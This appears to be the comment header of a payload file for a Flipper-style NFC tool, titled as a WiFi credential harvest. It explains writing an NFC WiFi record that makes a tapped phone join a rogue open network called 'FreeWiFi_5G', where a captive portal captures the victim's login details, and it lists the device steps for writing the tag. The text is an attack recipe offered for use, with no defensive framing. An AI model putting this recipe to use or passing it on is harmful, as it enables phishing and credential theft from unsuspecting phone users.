# ============================================================================
#  PAYLOAD 1: WIFI CREDENTIAL HARVEST (Captive Portal)
# ============================================================================
#  Writes a WiFi connection NDEF record.
#  When tapped, phone auto-connects to your rogue AP.
#  Rogue AP presents captive portal that captures credentials.
#
#  NDEF WiFi Simple Config:
#    SSID: "FreeWiFi_5G"
#    Auth: Open (no password)
#    Redirect to: <your-captive-portal-IP>
#
#  Flipper: NFC -> Saved -> [your tag] -> Write
#  Overwrite NDEF data with WiFi config record
